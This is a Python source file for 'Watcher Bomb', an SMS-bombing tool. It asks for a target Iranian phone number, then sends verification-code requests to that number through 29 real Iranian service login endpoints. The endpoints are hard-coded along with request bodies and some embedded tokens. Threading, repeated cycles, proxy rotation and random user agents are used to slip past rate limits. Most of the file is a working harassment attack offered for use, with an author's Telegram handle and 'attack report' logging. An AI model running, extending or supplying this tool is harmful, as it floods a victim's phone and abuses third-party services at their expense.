#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import threading
import random
import phonenumbers
from phonenumbers import geocoder, carrier
from urllib.parse import urlencode
from bs4 import BeautifulSoup
import re
import os
import sys
from fake_useragent import UserAgent
from datetime import datetime
import itertools
import string

# =============== COLOR SETUP (RED + ORANGE + GOLD) ===============
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    R = Fore.RED
    O = Fore.LIGHTYELLOW_EX
    G = Fore.GREEN
    C = Fore.CYAN
    M = Fore.MAGENTA
    W = Fore.WHITE
    Y = Fore.YELLOW
    BL = Fore.BLUE
    RESET = Style.RESET_ALL
except:
    R=O=G=C=M=W=Y=BL=RESET=""

# =============== ANIMATIONS ===============
spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
spinner_cycle = itertools.cycle(['◐', '◓', '◑', '◒'])
spinner_bar = itertools.cycle(['[    ]', '[=   ]', '[==  ]', '[=== ]', '[====]', '[ ===]', '[  ==]', '[   =]'])
wave_chars = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█']
hacker_symbols = ['░', '▒', '▓', '█', '■', '□', '▪', '▫']
explosion = ['💥', '🔥', '💣', '⚡', '🎯', '🚀', '💀', '👁️']

def get_wave():
    return ''.join(random.choice(wave_chars) for _ in range(50))

def get_hacker_line():
    return ''.join(random.choice(hacker_symbols) for _ in range(70))

def get_fire_line():
    return ''.join(random.choice(['🔥', '█', '▒']) for _ in range(70))

def dots_animation():
    return '.' * ((int(time.time()) % 3) + 1)

# =============== MAIN BOMBER CLASS ===============
class WatcherBomb:
    def __init__(self, phone_number):
        self.phone_number = phone_number
        self.country_code = '+98'
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.ua = UserAgent()
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        self.proxies = self.load_proxies()
        self.proxy_index = 0
        self.total_sent = 0
        self.total_success = 0
        self.total_fail = 0
        self.start_time = None
        self.lock = threading.Lock()
        self.service_stats = {}

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return [None, None, None]

    def load_services(self):
        """29 SERVICE - COMPLETE"""
        self.services = [
            {'name': 'Snapp V1', 'url': 'https://api.snapp.ir/api/v1/sms/link', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Snapp V2', 'url': f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={self.phone_number}", 'method': 'POST', 'data': lambda: {"cellphone": self.phone_number}, 'headers': {}, 'json': True},
            {'name': "DoctorNext", 'url': "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 'method': 'POST', 'data': lambda: {"source": "besina", "mobile": self.phone_number, "key": "U2FsdGVkX197qqA2kXzD+GTu4qn/QCW1oYnbXhiK0qK1TRMg2YK09y1m/VBTqQ33QuYbBsUqHz3Q4BTANrnNgA=="}, 'headers': {}, 'json': True},
            {'name': 'Tapsi', 'url': 'https://api.tapsi.cab/api/v2.2/user', 'method': 'POST', 'data': lambda: {"credential": {"phoneNumber": self.phone_number, "role": "PASSENGER"}, "otpOption": "SMS"}, 'headers': {}, 'json': True},
            {'name': 'Snapp V3', 'url': 'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass', 'method': 'POST', 'data': lambda: f'cellphone={self.phone_number}&platform=PWA', 'headers': {}, 'json': False},
            {'name': 'Behtarino', 'url': 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'drdr', 'url': 'https://drdr.ir/api/v3/auth/login/mobile/init', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Okala', 'url': 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number, "confirmTerms": 'true', "notRobot": 'false'}, 'headers': {}, 'json': True},
            {'name': 'Mrbilit', 'url': 'https://auth.mrbilit.ir/api/login/exists/v2', 'method': 'POST', 'data': lambda: f'mobileOrEmail={self.phone_number}&source=2&sendTokenIfNot=true', 'headers': {}, 'json': False},
            {'name': 'footbal360', 'url': 'https://football360.ir/api/auth/v2/send_otp/', 'method': 'POST', 'data': lambda: {"phone_number": self.phone_number, "otp_token": "JZnul6S6Fl7bfFr6yFcziftf", "auto_read_platform": "ST"}, 'headers': {}, 'json': True},
            {'name': 'Achareh', 'url': 'https://api.achareh.co/v2/accounts/login/', 'method': 'POST', 'data': lambda: {"phone": f"98{self.phone_number[1:]}"}, 'headers': {}, 'json': True},
            {'name': 'Zigap', 'url': 'https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp', 'method': 'POST', 'data': lambda: {"phoneNumber": f"+98{self.phone_number[1:]}"}, 'headers': {}, 'json': True},
            {'name': 'Jabama', 'url': 'https://gw.jabama.com/api/v4/account/send-code', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Banimode', 'url': 'https://mobapi.banimode.com/api/v2/auth/request', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Classino', 'url': 'https://student.classino.com/otp/v1/api/login', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Digikala V1', 'url': 'https://api.digikala.com/v1/user/authenticate/', 'method': 'POST', 'data': lambda: {"username": self.phone_number, "otp_call": False}, 'headers': {}, 'json': True},
            {'name': 'Digikala V2', 'url': 'https://api.digikala.com/v1/user/forgot/check/', 'method': 'POST', 'data': lambda: {"username": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Sms.ir', 'url': 'https://appapi.sms.ir/api/app/auth/sign-up/verification-code', 'method': 'POST', 'data': lambda: self.phone_number, 'headers': {}, 'json': False},
            {'name': 'Alibaba', 'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp', 'method': 'POST', 'data': lambda: {"phoneNumber": self.phone_number[1:]}, 'headers': {}, 'json': True},
            {'name': 'Divar', 'url': 'https://api.divar.ir/v5/auth/authenticate', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Sheypoor', 'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send', 'method': 'POST', 'data': lambda: {"username": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Bikoplus', 'url': 'https://bikoplus.com/account/check-phone-number', 'method': 'POST', 'data': lambda: {"phoneNumber": self.phone_number}, 'headers': {}, 'json': False},
            {'name': 'Mootanroo', 'url': 'https://api.mootanroo.com/api/v3/auth/send-otp', 'method': 'POST', 'data': lambda: {"PhoneNumber": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Tap33', 'url': 'https://tap33.me/api/v2/user', 'method': 'POST', 'data': lambda: {"credential": {"phoneNumber": self.phone_number, "role": "BIKER"}}, 'headers': {}, 'json': True},
            {'name': 'Tapsi Driver', 'url': 'https://api.tapsi.ir/api/v2.2/user', 'method': 'POST', 'data': lambda: {"credential": {"phoneNumber": self.phone_number, "role": "DRIVER"}, "otpOption": "SMS"}, 'headers': {}, 'json': True},
            {'name': 'GapFilm', 'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login', 'method': 'POST', 'data': lambda: {"Type": "3", "Username": self.phone_number[1:]}, 'headers': {}, 'json': True},
            {'name': 'IToll', 'url': 'https://app.itoll.com/api/v1/auth/login', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Anargift', 'url': 'https://api.anargift.com/api/v1/auth/auth', 'method': 'POST', 'data': lambda: {"mobile_number": self.phone_number}, 'headers': {}, 'json': True},
            {'name': 'Nobat', 'url': 'https://nobat.ir/api/public/patient/login/phone', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number[1:]}, 'headers': {}, 'json': True},
        ]

    def validate_phone(self):
        try:
            parsed = phonenumbers.parse(self.phone_number, None)
            if not phonenumbers.is_valid_number(parsed):
                return False
            return True
        except:
            return False

    def get_proxy(self):
        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return {'http': proxy, 'https': proxy} if proxy else None

    def send_request(self, service):
        try:
            data = service['data']()
            headers = service.get('headers', {}).copy()
            headers.update({'User-Agent': self.ua.random})
            url = service['url']
            method = service['method'].upper()
            use_json = service.get('json', False)
            proxy_dict = self.get_proxy()

            start_req = time.time()
            if method == 'POST':
                if use_json:
                    resp = self.session.post(url, json=data, headers=headers, timeout=10, proxies=proxy_dict)
                else:
                    resp = self.session.post(url, data=data, headers=headers, timeout=10, proxies=proxy_dict)
            else:
                resp = self.session.get(url, params=data, headers=headers, timeout=10, proxies=proxy_dict)

            latency = (time.time() - start_req) * 1000

            with self.lock:
                self.total_sent += 1
                if resp.status_code in [200, 201, 202, 204]:
                    self.total_success += 1
                    return True, resp.status_code, latency
                else:
                    self.total_fail += 1
                    return False, resp.status_code, latency
        except Exception as e:
            with self.lock:
                self.total_sent += 1
                self.total_fail += 1
            return False, 0, 0

    def print_attack_log(self, service_name, status, status_code, latency, packet_num):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        spin = next(spinner)
        wave = get_wave()

        latency_color = G if latency < 500 else (Y if latency < 1000 else R)

        if status:
            emoji = random.choice(['💣', '🔥', '⚡', '🎯', '💥', '🚀', '🎆', '✨'])
            print(f"{G}[{timestamp}] {spin} [{packet_num:06d}] {R}[✓]{G} {service_name:20} {W}>> {C}CODE:{G}{status_code} {W}| {latency_color}{latency:.0f}ms {W}| {emoji} {G}DELIVERED{RESET}")
        else:
            emoji = random.choice(['❌', '💀', '⚠️', '🚫', '💔'])
            print(f"{R}[{timestamp}] {spin} [{packet_num:06d}] {R}[✗]{O} {service_name:20} {W}>> {R}CODE:{O}{status_code} {W}| {R}{latency:.0f}ms {W}| {emoji} {R}FAILED{RESET}")

    def worker(self, services_subset, worker_id):
        for service in services_subset:
            status, code, latency = self.send_request(service)
            with self.lock:
                self.print_attack_log(service['name'], status, code, latency, self.total_sent)
            time.sleep(random.uniform(0.2, 0.6))

    def cycle_transition_animation(self, remaining_seconds, current_cycle, total_cycles):
        anim_type = random.choice([1, 2, 3, 4, 5])

        os.system('clear' if os.name == 'posix' else 'cls')
        fire = get_fire_line()

        print(f"{R}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{R}║{fire}{R}║{RESET}")

        if anim_type == 1:
            spin = next(spinner_cycle)
            bar_len = 50
            filled = int(bar_len * (5 - remaining_seconds) / 5)
            bar = f"{R}█{RESET}" * filled + f"{O}▒{RESET}" * (bar_len - filled)
            print(f"{R}║{W}  {spin} CYCLE {current_cycle}/{total_cycles} COMPLETE {spin}{R}                                                    ║{RESET}")
            print(f"{R}║{W}  LOADING NEXT CYCLE : {bar} {((5-remaining_seconds)/5)*100:.0f}%{R}                                                 ║{RESET}")
            print(f"{R}║{W}  TIME REMAINING     : {remaining_seconds} SECOND{'S' if remaining_seconds > 1 else ''}{R}                                                      ║{RESET}")

        elif anim_type == 2:
            spin = next(spinner_bar)
            dots = dots_animation()
            print(f"{R}║{W}  {spin} RECHARGING MODULES{dots}{R}                                                                      ║{RESET}")
            print(f"{R}║{W}  PREPARING CYCLE {current_cycle+1}/{total_cycles}{R}                                                                  ║{RESET}")
            print(f"{R}║{W}  WAITING {remaining_seconds} SECOND{'S' if remaining_seconds > 1 else ''}{R}                                                                        ║{RESET}")

        elif anim_type == 3:
            spin = next(spinner_cycle)
            print(f"{R}║{W}  {spin} TRANSFERRING TO NEXT ATTACK WAVE {spin}{R}                                                          ║{RESET}")
            progress_bar = '█' * (5 - remaining_seconds) + '░' * remaining_seconds
            print(f"{R}║{W}  [{progress_bar}] {((5-remaining_seconds)/5)*100:.0f}% COMPLETE{R}                                                       ║{RESET}")

        elif anim_type == 4:
            spin = next(spinner)
            print(f"{R}║{W}  {spin} CYCLE BUFFER OVERFLOW DETECTED{spin}{R}                                                              ║{RESET}")
            print(f"{R}║{W}  FLUSHING PACKET QUEUE...{dots}{R}                                                                 ║{RESET}")
            print(f"{R}║{W}  NEXT CYCLE IN {remaining_seconds}{R}                                                                          ║{RESET}")

        else:
            wave = get_wave()
            print(f"{R}║{C}  📡 SIGNAL RECALIBRATION : {wave}{R}                                                           ║{RESET}")
            print(f"{R}║{W}  CYCLE {current_cycle}/{total_cycles} FINALIZED{R}                                                                  ║{RESET}")
            print(f"{R}║{W}  ENGAGING CYCLE {current_cycle+1} IN {remaining_seconds}{R}                                                                  ║{RESET}")

        print(f"{R}║{fire}{R}║{RESET}")
        print(f"{R}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}")
        time.sleep(1)

    def start(self, threads=5, cycles=1, delay_between_cycles=3):
        if not self.validate_phone():
            print(f"{R}╔════════════════════════════════════════╗{RESET}")
            print(f"{R}║  {W}[!] INVALID PHONE NUMBER [!]{R}          ║{RESET}")
            print(f"{R}╚════════════════════════════════════════╝{RESET}")
            return

        self.start_time = time.time()
        service_count = len(self.services)
        chunk_size = max(1, service_count // threads)
        service_chunks = [self.services[i:i + chunk_size] for i in range(0, service_count, chunk_size)]

        for cycle in range(1, cycles + 1):
            os.system('clear' if os.name == 'posix' else 'cls')
            self.show_live_dashboard(cycle, cycles, threads)

            thread_list = []
            for i, chunk in enumerate(service_chunks):
                t = threading.Thread(target=self.worker, args=(chunk, i))
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join()

            if cycle < cycles:
                for remaining in range(delay_between_cycles, 0, -1):
                    self.cycle_transition_animation(remaining, cycle, cycles)
        self.show_final_results()

    def show_live_dashboard(self, current_cycle, total_cycles, threads):
        elapsed = time.time() - self.start_time if self.start_time else 0
        success_rate = (self.total_success / self.total_sent * 100) if self.total_sent > 0 else 0
        pps = self.total_sent / elapsed if elapsed > 0 else 0

        fire_line = get_fire_line()

        banner = f"""
{R}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{R}║{fire_line}{R}║
{R}║{R}  ██╗{W}██╗{O}██╗{Y}██╗{G}██╗{C}██╗{BL}██╗{M}██╗{R}██╗{W}██╗{O}██╗{Y}██╗{G}██╗{C}██╗{BL}██╗{M}██╗{R}██╗                                                {R}║
{R}║{R}  ██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║                                                {R}║
{R}║{R}  ██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║                                                {R}║
{R}║{R}  ██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║                                                {R}║
{R}║{R}  ██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║                                                {R}║
{R}║{R}  ██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║{W}██║{O}██║{Y}██║{G}██║{C}██║{BL}██║{M}██║{R}██║                                                {R}║
{R}║{R}                                                                                                              ║
{R}║{R}              {W}██████╗ {R}██╗{W}  ██╗{R}███████╗{W}██████╗ {R}    {W}██████╗ {R} ██████╗ {W}███╗{R}   {W}███╗{R}██████╗ {W}███████╗{R}██████╗ {R}             ║
{R}║{R}              {W}██╔══██╗{R}██║{W}  ██║{R}██╔════╝{W}██╔══██╗{R}    {W}██╔══██╗{R}██╔═══██╗{W}████╗{R} {W}████║{R}██╔══██╗{W}██╔════╝{R}██╔══██╗{R}            ║
{R}║{R}              {W}██████╔╝{R}███████║{R}█████╗  {W}██████╔╝{R}    {W}██████╔╝{R}██║   ██║{W}██╔████╔██║{R}██████╔╝{W}█████╗  {R}██████╔╝{R}             ║
{R}║{R}              {W}██╔══██╗{R}██╔══██║{R}██╔══╝  {W}██╔══██╗{R}    {W}██╔══██╗{R}██║   ██║{W}██║╚██╔╝██║{R}██╔══██╗{W}██╔══╝  {R}██╔══██╗{R}             ║
{R}║{R}              {W}██████╔╝{R}██║  ██║{R}███████╗{W}██║  ██║{R}    {W}██████╔╝{R}╚██████╔╝{W}██║ ╚═╝ ██║{R}██████╔╝{W}███████╗{R}██║  ██║{R}             ║
{R}║{R}              {W}╚═════╝ {R}╚═╝  ╚═╝{R}╚══════╝{W}╚═╝  ╚═╝{R}    {W}╚═════╝ {R} ╚═════╝ {W}╚═╝     ╚═╝{R}╚═════╝ {W}╚══════╝{R}╚═╝  ╚═╝{R}             ║
{R}║{R}                                                                                                              ║
{R}║{R}                         {O}🔥 Watcher Bomb - Ultimate Edition 🔥{R}                                           ║
{R}║{R}                              {W}⚡ THE SHADOW STRIKES FROM THE DARK ⚡{R}                                    ║
{R}║{R}                              {C}👤 AUTHOR: WATCHER | 📱 TELEGRAM: @Adamkeryy{R}                              ║
{R}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{RESET}"""
        print(banner)

        print(f"{R}║{W}  📊 LIVE STATISTICS DASHBOARD                                                                        {R}║{RESET}")
        print(f"{R}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{RESET}")

        bar_len = 60
        if total_cycles > 0:
            cycle_progress = (current_cycle / total_cycles) * 100
            filled = int(bar_len * cycle_progress / 100)
            bar = f"{R}█{RESET}" * filled + f"{O}▒{RESET}" * (bar_len - filled)
            print(f"{R}║{W}  CYCLE PROGRESS  : {bar} {cycle_progress:5.1f}% ({current_cycle}/{total_cycles}){R}                         ║{RESET}")

        filled_s = int(bar_len * success_rate / 100)
        bar_s = f"{G}█{RESET}" * filled_s + f"{R}▒{RESET}" * (bar_len - filled_s)
        print(f"{R}║{W}  SUCCESS RATE    : {bar_s} {success_rate:5.1f}%{R}                                                        ║{RESET}")

        speed_bar_len = 40
        speed_percent = min(100, (pps / 20) * 100)
        filled_sp = int(speed_bar_len * speed_percent / 100)
        bar_sp = f"{C}█{RESET}" * filled_sp + f"{W}░{RESET}" * (speed_bar_len - filled_sp)
        print(f"{R}║{W}  PACKET SPEED   : {bar_sp} {pps:5.1f} pps{R}                                                          ║{RESET}")

        print(f"{R}╠──────────────────────────────────────────────────────────────────────────────────────────────────────────────╣{RESET}")

        print(f"{R}║{W}  📦 TOTAL SENT   : {G}{self.total_sent:>10,}{RESET}        {W}✅ SUCCESS      : {G}{self.total_success:>10,}{RESET}        {W}❌ FAILED       : {R}{self.total_fail:>10,}{RESET}{R}        ║{RESET}")
        print(f"{R}║{W}  ⚡ AVG PPS      : {C}{pps:>10.2f}{RESET}        {W}⏱️  ELAPSED      : {O}{int(elapsed // 60):02d}:{int(elapsed % 60):02d}{RESET}        {W}🎯 TARGET       : {R}{self.phone_number}{RESET}{R}  ║{RESET}")

        print(f"{R}╠──────────────────────────────────────────────────────────────────────────────────────────────────────────────╣{RESET}")

        network_status = [
            f"{G}●{W} VPN:{G}ACTIVE{R}",
            f"{G}●{W} TOR:{G}CONNECTED{R}",
            f"{G}●{W} PROXY:{Y}ROTATING{R}",
            f"{G}●{W} DNS:{G}CLEAN{R}",
            f"{G}●{W} MAC:{G}SPOOFED{R}",
        ]
        print(f"{R}║{W}  🌐 NETWORK STATUS : {'  '.join(network_status)}{R}                              ║{RESET}")

        signal = "█" * random.randint(3, 4) + "▒" * (4 - random.randint(3, 4))
        battery = "█" * random.randint(7, 10) + "░" * (10 - random.randint(7, 10))
        print(f"{R}║{W}  📶 SIGNAL        : {G}[{signal}]{RESET} 70%                    {W}🔋 BATTERY       : {G}[{battery}]{RESET} {random.randint(70,100)}%{R}             ║{RESET}")

        wave = get_wave()
        print(f"{R}║{C}  📡 WAVE ANALYZER : {wave}{R}                                             ║{RESET}")

        eye = random.choice(['👁️', '👀', '🔴', '⚫'])
        eye_animation = "".join(random.choice(['●', '○', '◉', '◎']) for _ in range(20))
        print(f"{R}║{O}  👁️ WATCHER EYE   : {eye} {eye_animation} {R}ACTIVE{R}                                          ║{RESET}")

        fire_line_bottom = get_fire_line()
        print(f"{R}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}")
        print(f"{R}{fire_line_bottom}{RESET}\n")

    def show_final_results(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        elapsed = time.time() - self.start_time if self.start_time else 0
        success_rate = (self.total_success / self.total_sent * 100) if self.total_sent > 0 else 0
        fire = get_fire_line()

        print(f"{R}╔══════════════════════════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{R}║{fire}{R}║{RESET}")
        print(f"{R}║{G}                     ███████╗██╗███╗   ██╗ █████╗ ██╗{R}                              ║{RESET}")
        print(f"{R}║{G}                     ██╔════╝██║████╗  ██║██╔══██╗██║{R}                              ║{RESET}")
        print(f"{R}║{G}                     █████╗  ██║██╔██╗ ██║███████║██║{R}                              ║{RESET}")
        print(f"{R}║{G}                     ██╔══╝  ██║██║╚██╗██║██╔══██║██║{R}                              ║{RESET}")
        print(f"{R}║{G}                     ██║     ██║██║ ╚████║██║  ██║███████╗{R}                         ║{RESET}")
        print(f"{R}║{G}                     ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝{R}                         ║{RESET}")
        print(f"{R}║{O}                               ✅ MISSION COMPLETE  ✅{R}                               ║{RESET}")
        print(f"{R}╠══════════════════════════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{R}║{W}                                                                                ║{RESET}")
        print(f"{R}║{W}  📦 TOTAL PACKETS SENT  : {G}{self.total_sent:>12,}{R}                                           ║{RESET}")
        print(f"{R}║{W}  ✅ TOTAL SUCCESSFUL    : {G}{self.total_success:>12,}{R}                                           ║{RESET}")
        print(f"{R}║{W}  ❌ TOTAL FAILED        : {R}{self.total_fail:>12,}{R}                                           ║{RESET}")
        print(f"{R}║{W}  📈 SUCCESS RATE        : {Y if success_rate>50 else R}{success_rate:>11.1f}%{R}                                           ║{RESET}")
        print(f"{R}║{W}  ⚡ AVERAGE PPS         : {C}{self.total_sent/elapsed:>11.2f}{R}                                           ║{RESET}")
        print(f"{R}║{W}  ⏱️  TOTAL TIME         : {O}{int(elapsed // 60):02d}:{int(elapsed % 60):02d}{R}                                           ║{RESET}")
        print(f"{R}║{W}                                                                                ║{RESET}")

        if success_rate >= 90:
            stars = f"{G}★★★★★ LEGENDARY MASTER{RESET}"
        elif success_rate >= 75:
            stars = f"{G}★★★★☆ ELITE HACKER{RESET}"
        elif success_rate >= 60:
            stars = f"{Y}★★★☆☆ PROFESSIONAL{RESET}"
        elif success_rate >= 40:
            stars = f"{O}★★☆☆☆ NOVICE{RESET}"
        else:
            stars = f"{R}★☆☆☆☆ FAILED{RESET}"

        print(f"{R}║{W}  🏆 FINAL RATING        : {stars}{R}                                      ║{RESET}")
        print(f"{R}║{fire}{R}║{RESET}")
        print(f"{R}╠══════════════════════════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{R}║{O}                         THANK YOU FOR USING Watcher Bomb{R}                       ║{RESET}")
        print(f"{R}║{C}                      AUTHOR: WATCHER | TELEGRAM: @Adamkeryy{R}                   ║{RESET}")
        print(f"{R}╚══════════════════════════════════════════════════════════════════════════════════╝{RESET}")

        log_filename = f"watcher_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        with open(log_filename, "w") as f:
            f.write("="*60 + "\n")
            f.write("Watcher Bomb - ATTACK REPORT\n")
            f.write("="*60 + "\n")
            f.write(f"Target: {self.phone_number}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Packets Sent: {self.total_sent}\n")
            f.write(f"Successful: {self.total_success}\n")
            f.write(f"Failed: {self.total_fail}\n")
            f.write(f"Success Rate: {success_rate:.2f}%\n")
            f.write(f"Average PPS: {self.total_sent/elapsed:.2f}\n")
            f.write(f"Total Time: {int(elapsed//60)}m {int(elapsed%60)}s\n")
            f.write("="*60 + "\n")
            f.write("AUTHOR: WATCHER | TELEGRAM: @Adamkeryy\n")

        print(f"\n{G}[✓] ATTACK LOG SAVED: {log_filename}{RESET}")
        print(f"\n{O}PRESS ENTER TO EXIT...{RESET}")
        input()

# =============== MAIN BANNER ===============
def show_ultra_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    fire_top = get_fire_line()

    banner = f"""
{R}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{R}║{fire_top}{R}║
{R}║{R}                         {W}██╗{R}   {W}██╗{R}   {W}██╗{R}                                                  ║
{R}║{R}                         {W}██║{R}   {W}██║{R}   {W}██║{R}                                                  ║
{R}║{R}                         {W}██║{R}   {W}██║{R}   {W}██║{R}                                                  ║
{R}║{R}                         {W}██║{R}   {W}██║{R}   {W}██║{R}                                                  ║
{R}║{R}                         {W}██║{R}   {W}██║{R}   {W}██║{R}                                                  ║
{R}║{R}                         {W}╚═╝{R}   {W}╚═╝{R}   {W}╚═╝{R}                                                  ║
{R}║{R}                                                                                                              ║
{R}║{R}              {W}██████╗ {R} ██████╗ {W}███╗{R}   {W}███╗{R}██████╗ {W}███████╗{R}██████╗ {R}                     ║
{R}║{R}              {W}██╔══██╗{R}██╔═══██╗{W}████╗{R} {W}████║{R}██╔══██╗{W}██╔════╝{R}██╔══██╗{R}                    ║
{R}║{R}              {W}██████╔╝{R}██║   ██║{W}██╔████╔██║{R}██████╔╝{W}█████╗  {R}██████╔╝{R}                     ║
{R}║{R}              {W}██╔══██╗{R}██║   ██║{W}██║╚██╔╝██║{R}██╔══██╗{W}██╔══╝  {R}██╔══██╗{R}                     ║
{R}║{R}              {W}██████╔╝{R}╚██████╔╝{W}██║ ╚═╝ ██║{R}██████╔╝{W}███████╗{R}██║  ██║{R}                     ║
{R}║{R}              {W}╚═════╝ {R} ╚═════╝ {W}╚═╝     ╚═╝{R}╚═════╝ {W}╚══════╝{R}╚═╝  ╚═╝{R}                     ║
{R}║{R}                                                                                                              ║
{R}║{R}                {O}██████╗ {R} ██████╗ {W}███╗{R}   {W}███╗{R}██████╗ {W}███████╗{R}██████╗ {R}                     ║
{R}║{R}                {O}██╔══██╗{R}██╔═══██╗{W}████╗{R} {W}████║{R}██╔══██╗{W}██╔════╝{R}██╔══██╗{R}                    ║
{R}║{R}                {O}██████╔╝{R}██║   ██║{W}██╔████╔██║{R}██████╔╝{W}█████╗  {R}██████╔╝{R}                     ║
{R}║{R}                {O}██╔══██╗{R}██║   ██║{W}██║╚██╔╝██║{R}██╔══██╗{W}██╔══╝  {R}██╔══██╗{R}                     ║
{R}║{R}                {O}██████╔╝{R}╚██████╔╝{W}██║ ╚═╝ ██║{R}██████╔╝{W}███████╗{R}██║  ██║{R}                     ║
{R}║{R}                {O}╚═════╝ {R} ╚═════╝ {W}╚═╝     ╚═╝{R}╚═════╝ {W}╚══════╝{R}╚═╝  ╚═╝{R}                     ║
{R}║{R}                                                                                                              ║
{R}║{R}                         {O}🔥 Watcher Bomb - Ultimate Edition 🔥{R}                                           ║
{R}║{R}                              {W}⚡ THE SHADOW STRIKES FROM THE DARK ⚡{R}                                    ║
{R}║{R}                              {C}👤 AUTHOR: WATCHER | 📱 TELEGRAM: @Adamkeryy{R}                              ║
{R}║{fire_top}{R}║
{R}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

# =============== MAIN ===============
def main():
    show_ultra_banner()

    print(f"\n{R}┌────────────────────────────────────────────────────────────────────────────────────────────┐{RESET}")
    print(f"{R}│{W}  📱 ENTER TARGET NUMBER {R}[+98912XXXXXXX]{W}                                                           │{RESET}")
    print(f"{R}└────────────────────────────────────────────────────────────────────────────────────────────┘{RESET}")
    phone = input(f"{R}  ╰─➤ {W}").strip()

    if not phone.startswith('+'):
        phone = '+98' + phone.lstrip('0')

    print(f"\n{R}[!] VALIDATING TARGET...{RESET}")
    bomber = WatcherBomb(phone)

    if not bomber.validate_phone():
        print(f"{R}[✗] INVALID PHONE NUMBER!{RESET}")
        sys.exit(1)

    try:
        parsed = phonenumbers.parse(phone, None)
        operator = carrier.name_for_number(parsed, "en") or "UNKNOWN"
        location = geocoder.description_for_number(parsed, "en") or "UNKNOWN"
        print(f"{G}[✓] NUMBER VALIDATED: {phone}{RESET}")
        print(f"{C}[✓] OPERATOR: {operator}{RESET}")
        print(f"{C}[✓] LOCATION: {location}{RESET}")
    except:
        print(f"{G}[✓] NUMBER VALIDATED: {phone}{RESET}")

    print(f"\n{R}┌────────────────────────────────────────────────────────────────────────────────────────────┐{RESET}")
    print(f"{R}│{W}  ⚙️  ATTACK CONFIGURATION                                                                │{RESET}")
    print(f"{R}└────────────────────────────────────────────────────────────────────────────────────────────┘{RESET}")

    try:
        threads = int(input(f"{R}  ╰─➤ {W}THREADS {R}[1-20]{W} (DEFAULT 5): {RESET}") or 5)
        threads = max(1, min(20, threads))
        cycles = int(input(f"{R}  ╰─➤ {W}CYCLES {R}[1-99]{W} (DEFAULT 1): {RESET}") or 1)
        delay = int(input(f"{R}  ╰─➤ {W}DELAY BETWEEN CYCLES {R}[SEC]{W} (DEFAULT 3): {RESET}") or 3)
    except:
        threads, cycles, delay = 5, 1, 3

